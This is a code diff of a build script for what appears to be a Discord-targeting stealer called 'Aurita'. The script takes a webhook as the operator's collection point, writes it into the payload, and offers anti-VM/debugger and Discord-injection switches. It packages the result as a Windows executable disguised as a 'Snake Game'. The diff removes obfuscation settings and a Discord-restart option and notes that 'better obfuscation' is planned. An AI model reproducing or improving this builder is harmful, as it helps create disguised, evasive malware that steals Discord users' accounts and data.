@@ -1,7 +1,6 @@
 const { key_res, decode_B64, msg, is_webhook } = require("./src/utils/functions/functions.js");
 const { build, Platform, Arch } = require("electron-builder");
 const { spawnSync } = require("child_process");
-const { obfuscate } = require("js-confuser");
 const readline = require("readline");
 const fs = require("fs");
 const path = require("path");
@@ -58,7 +57,7 @@ const create_build = async (dest, JSON) => {
     });
 
     fs.rename(`./build/dist/${EXECUTABLE_NAME}/${EXECUTABLE_NAME}.exe`, `./${EXECUTABLE_NAME}.exe`, (err) => {
-      if (err) console.error('The file is inside "./build/dist"'); else console.log(msg(`File name "${EXECUTABLE_NAME}"`));
+      if (err) console.error('The file is inside "./build/dist"'); else console.log(msg(`Executable file as "${EXECUTABLE_NAME}"`));
     });
 
   } catch (err) {
@@ -71,12 +70,11 @@ const create_obfuscation = async (JSON) => {
     EXECUTABLE_NAME = JSON.EXECUTABLE_NAME ?? "Aurita",
     AUTHOR = JSON.AUTHOR ?? "k4itrun",
     LICENSE = JSON.LICENSE ?? "MIT",
-    DESC = JSON.DESC ?? "Game to die For",
-    APP_COMPANY = JSON.APP_COMPANY ?? "Company Snake",
-    COPYRIGHT = JSON.COPYRIGHT ?? "Copyright",
+    DESC = JSON.DESC ?? "Do Do-Hee <3",
+    APP_COMPANY = JSON.APP_COMPANY ?? "Snake Company",
+    COPYRIGHT = JSON.COPYRIGHT ?? "Snake Copyright",
     APP_FILE_DESC = JSON.DESC ?? "Snake Game",
     ERROR_MESSAGE = JSON.ERROR_MESSAGE ?? "",
-    KILL_DISCORDS = JSON.KILL_DISCORDS,
     VM_DEBUGGER = JSON.VM_DEBUGGER,
     DC_INJECTION = JSON.DC_INJECTION,
     VERSION = JSON.VERSION ?? "2.0.0";
@@ -106,34 +104,10 @@ const create_obfuscation = async (JSON) => {
         if (fs.statSync(FILE_PATH).isDirectory()) {
           await obf_files(FILE_PATH);
         } else if (file.endsWith(".js") && !FILE_PATH.includes("node_modules") && !file.includes("build.js")) {
-          await fs.writeFileSync(FILE_PATH, await obfuscate(fs.readFileSync(FILE_PATH, "utf-8"), {
-            "target": "node",
-            "controlFlowFlattening": 0,
-            "minify": false,
-            "globalConcealing": true,
-            //"stringCompression": 1,
-            "stringConcealing": 0.9,
-            "stringEncoding": 0.3,
-            "stringSplitting": 1,
-            "deadCode": 0,
-            "calculator": 0.5,
-            "compact": true,
-            "movedDeclarations": false,
-            "objectExtraction": false,
-            "stack": true,
-            "duplicateLiteralsRemoval": 0,
-            "flatten": false,
-            "dispatcher": true,
-            "opaquePredicates": 0,
-            "shuffle": {
-              "hash": 0.6,
-              "true": 0.6
-            },
-            "renameVariables": false,
-            "renameGlobals": false,
-          }));
-        }
+          
+          await fs.writeFileSync(FILE_PATH, fs.readFileSync(FILE_PATH, "utf-8")); //later added better obfuscation
 
+        }
       }
     } catch (e) {
       console.error(e)
@@ -172,7 +146,6 @@ const create_obfuscation = async (JSON) => {
       fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
         .replace(/%WEBHOOK%/g, WEBHOOK)
         .replace(/%ERROR_MESSAGE%/g, ERROR_MESSAGE)
-        .replace(/%KILL_DISCORDS%/g, KILL_DISCORDS)
         .replace(/%VM_DEBUGGER%/g, VM_DEBUGGER)
         .replace(/%DC_INJECTION%/g, DC_INJECTION)
       );
@@ -185,10 +158,10 @@ const create_obfuscation = async (JSON) => {
     try {
       fs.readdirSync(dir).forEach((file) => {
         const FILE_PATH = path.join(dir, file);
-        if (fs.statSync(FILE_PATH).isDirectory()) traverse(FILE_PATH);
-        else if (file.endsWith(".js") && !FILE_PATH.includes("node_modules")) replace_keys(FILE_PATH);
-        else if (file.endsWith(".json") && !FILE_PATH.includes("node_modules")) replace_infos(FILE_PATH);
-        else if (file.endsWith("build.bat")) replace_bat(FILE_PATH);
+        if (fs.statSync(FILE_PATH).isDirectory()) { traverse(FILE_PATH) }
+        else if (file.endsWith(".js") && !FILE_PATH.includes("node_modules")) { replace_keys(FILE_PATH) }
+        else if (file.endsWith(".json") && !FILE_PATH.includes("node_modules")) { replace_infos(FILE_PATH) }
+        else if (file.endsWith("build.bat")) { replace_bat(FILE_PATH) }
       });
     } catch (e) {
       console.error(e)
@@ -247,7 +220,7 @@ async function create_fucking() {
       console.log(instagram(MAIN_BANNER));
 
       let webhook = await ask("Add your \"WEBHOOK\": ");
-      while (!is_webhook(webhook)) webhook = await ask("Add your \"WEBHOOK\": ");
+      while (!is_webhook(webhook)) webhook = await ask("Add a \"WEBHOOK\" validity: ");
 
       JSON["WEBHOOK"] = webhook;
       JSON["EXECUTABLE_NAME"] = await ask("Please specify your 'EXE' file \"Name\": ");
@@ -255,12 +228,11 @@ async function create_fucking() {
       JSON["LICENSE"] = await ask("Please specify your 'EXE' file \"License\": ");
       JSON["DESC"] = await ask("Please specify your 'EXE' file \"Description\": ");
       JSON["APP_COMPANY"] = await ask("Please specify your 'EXE' file \"App Company\": ");
-      JSON["COPYRIGHT"] = await ask("Please specify your 'EXE' file \"App Legal Copyright\": ");
+      JSON["COPYRIGHT"] = await ask("Please specify your 'EXE' file \"Legal Copyright\": ");
       JSON["ERROR_MESSAGE"] = await ask("Please specify your 'EXE' file \"Alert Error Message\": ");
-      JSON["KILL_DISCORDS"] = key_res(await ask("Restart Discord(s)? \"[Y or N]\": "));
       JSON["VM_DEBUGGER"] = key_res(await ask("Block debug and VM? \"[Y or N]\": "));
       JSON["DC_INJECTION"] = key_res(await ask("Inject all Discord(s)? \"[Y or N]\": "));
-    
+
       rl.close();
       console.clear();
 
